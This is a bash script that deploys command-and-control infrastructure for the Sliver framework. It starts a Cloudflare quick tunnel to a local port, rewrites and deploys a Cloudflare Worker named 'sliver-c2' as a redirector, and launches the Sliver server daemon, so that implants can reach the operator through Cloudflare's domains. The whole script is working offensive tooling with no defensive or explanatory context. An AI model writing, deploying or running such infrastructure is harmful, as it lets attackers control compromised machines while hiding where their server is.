#!/bin/bash
set -e
export CLOUDFLARE_API_TOKEN="token"

echo "[*] running cloudflare"
pkill -f cloudflared 2>/dev/null || true
cloudflared tunnel --url http://localhost:8080 > ~/c2-tunnel.log 2>&1 &
sleep 6

TUNNEL=$(grep -oP '[a-z0-9-]+\.trycloudflare\.com' ~/c2-tunnel.log || true)
if [ -z "$TUNNEL" ]; then
    echo "[!] log control: ~/c2-tunnel.log"
    exit 1
fi
echo "[+] tunnel url: https://$TUNNEL"

echo "[*] settting up worker $TUNNEL"
cd ~/sliver-worker
sed -i "s|https://[a-z0-9-]*\.trycloudflare\.com|https://$TUNNEL|g" worker.js || true
wrangler deploy --name sliver-c2 --var TUNNEL_URL:$TUNNEL

echo "[*] running server"
pkill sliver-server 2>/dev/null || true
sliver daemon --lhost 127.0.0.1 --lport 8080 > ~/sliver.log 2>&1 &
sleep 3

echo "[+] its working url: ur https from cf worker"
echo "[*] connect url."
